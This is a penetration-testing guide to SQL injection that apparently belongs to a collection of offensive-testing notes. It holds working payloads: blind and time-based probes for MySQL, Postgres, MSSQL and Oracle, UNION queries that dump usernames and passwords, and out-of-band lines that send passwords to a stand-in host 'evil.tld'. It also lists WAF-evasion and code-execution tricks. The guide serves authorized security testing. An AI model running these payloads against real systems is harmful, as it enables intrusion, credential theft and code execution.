# SQL Injection

Everyone knows `' OR '1'='1`. The findings that survive in 2026 are blind, second-order, in ORM edge cases, in places people do not parameterize because they "cannot" (column names, `ORDER BY`, `LIMIT`, JSON paths), and behind WAFs. This file is about those.

## The mental model

Your input becomes part of a SQL statement because it was concatenated instead of bound. The exploit is to break out of the intended data context into the query structure. Modern apps parameterize the obvious `WHERE id = ?`, so you hunt the places parameterization is awkward: identifiers (table/column names), sort direction and columns, pagination, dynamic filters, search DSLs, and raw-query escape hatches in ORMs.

## Where it hides / tell-tales

- **Non-parameterizable positions**: `ORDER BY`, column and table names, `LIMIT`/`OFFSET`, `GROUP BY`, and `ASC`/`DESC` cannot be bound as parameters, so developers build them with string concatenation. A sort parameter (`?sort=name`) is a prime target.
- **ORM raw fragments**: `.where("status = '#{params[:status]}'")`, `extra()`, `raw()`, `.whereRaw()`, `$queryRaw`, Sequelize `literal()`. The ORM protects the common path and leaves these.
- **Second-order**: input stored safely, then later concatenated into a query by a different code path (a report, an admin view, a background job). You inject at write time; it fires at read time elsewhere.
- **Numeric contexts without quotes**: `WHERE id = $input` where `$input` is not quoted; no quote-breaking needed, just `1 OR 1=1`, `1; ...`, or arithmetic.
- **JSON and path operators**: Postgres `->>`, MySQL `JSON_EXTRACT`, and dynamic JSON key access built by concatenation.
- **Boolean/time-only signals**: no data or errors returned, but the page differs for true vs false conditions, or you can make it sleep. That is blind SQLi, and it is everywhere people think they are safe because "no error shows."
- **Header and cookie injection**: `User-Agent`, `X-Forwarded-For`, `Referer`, and cookies logged or queried into analytics/audit tables, often unparameterized.

## Real material

`ORDER BY` injection (cannot be parameterized, so frequently vulnerable). Confirm with a conditional sort:

```
?sort=(CASE WHEN (1=1) THEN name ELSE id END)        -- order changes if injectable
?sort=name;SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN 1 ELSE 1/0 END
```

Boolean-blind extraction (Postgres), one character at a time:

```sql
' AND (SELECT SUBSTRING(current_database(),1,1))='a' --
' AND (SELECT ascii(substring(usename,1,1)) FROM pg_user LIMIT 1) > 109 --
```

Time-based blind (per DBMS, for when nothing reflects):

```sql
-- MySQL
' AND IF(SUBSTRING(@@version,1,1)='8', SLEEP(5), 0)-- -
-- Postgres
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
-- MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'--
-- Oracle
' AND 1=(SELECT CASE WHEN 1=1 THEN dbms_pipe.receive_message('a',5) ELSE 1 END FROM dual)--
```

UNION-based (when results are reflected). Find the column count with `ORDER BY n` or `UNION SELECT NULL,NULL,...`, then pull data:

```sql
' UNION SELECT NULL, table_name, NULL FROM information_schema.tables-- -
' UNION SELECT NULL, concat(username,':',password), NULL FROM users-- -
```

Out-of-band exfiltration when blind and no timing channel (DBMS-specific DNS/HTTP):

```sql
-- MSSQL
'; EXEC master..xp_dirtree '\\'+(SELECT TOP 1 password FROM users)+'.evil.tld\x'--
-- Oracle
' AND (SELECT UTL_INADDR.get_host_address((SELECT password FROM users WHERE rownum=1)||'.evil.tld') FROM dual) IS NOT NULL--
-- Postgres (via COPY ... PROGRAM on superuser, or dblink)
```

## Beyond the basics

- **Prioritize blind as the default**: assume no errors and no reflection. Build a reliable true/false oracle (a content difference, a status code, a redirect) or a timing oracle, then automate extraction. Most real modern SQLi is blind.
- **Second-order hunting**: inject a canary (`sqli'--x`) into every stored field (name, address, bio, device name), then browse every feature that later displays or reports on that data, especially admin panels and exports. The fire happens away from the injection.
- **Identifier-position injection**: when the vulnerable spot is a column/table name, you cannot use quotes the same way; use subqueries, `CASE`, and boolean conditions that are valid in that position (as in the `ORDER BY` examples).
- **WAF evasion**: inline comments (`/**/`), case randomization, keyword splitting (`UN/**/ION`), alternate whitespace (`%0a`, `%09`, `/**/`), scientific/hex numeric encodings, `LIKE` instead of `=`, and function synonyms. See `WAF-and-Filter-Bypass.md`. Also move the payload to a less-inspected parameter location (JSON body, header, cookie).
- **Stacked queries and RCE**: MSSQL `xp_cmdshell`, Postgres `COPY ... TO/FROM PROGRAM` (superuser) and large-object file write, MySQL `INTO OUTFILE` to write a webshell (when `secure_file_priv` allows and you know the web root). These turn SQLi into code execution; check privileges first with `current_user`, `is_superuser`, `@@version`.
- **Reading files and credentials**: `LOAD_FILE()` (MySQL), `pg_read_file()` (Postgres superuser), `information_schema` for schema, and the DBMS user tables for hashes to crack offline.
- **NoSQL sits next door**: if the backend is Mongo/Elastic/etc., switch techniques, see `NoSQL-Injection.md`. Do not assume SQL.

## What to watch for

- A timing payload can be fooled by network jitter; use differential timing (compare `SLEEP(0)` vs `SLEEP(5)`) and repeat to confirm.
- A `500` error is a signal, not a confirmation; prove you control the query logic (boolean oracle flips predictably) before claiming injection.
- Automated tools miss non-standard positions (headers, JSON, `ORDER BY`) and second-order; manual testing finds what scanners cannot.
- `INTO OUTFILE` and `PROGRAM` writes are destructive/high-impact; demonstrate read and schema access first, and get explicit authorization before any write-to-disk or RCE step.

## Hunting checklist

- Test every sort, filter, pagination, and search parameter, not just `id`.
- Build a boolean and a timing oracle; assume blind.
- Plant canaries in stored fields and hunt second-order fires in reports and admin views.
- Fingerprint the DBMS (`version()`, error strings, timing function names) to pick the right payloads.
- Test header/cookie injection into logging and analytics queries.
- If injectable, enumerate privileges before attempting file read/write or stacked RCE.
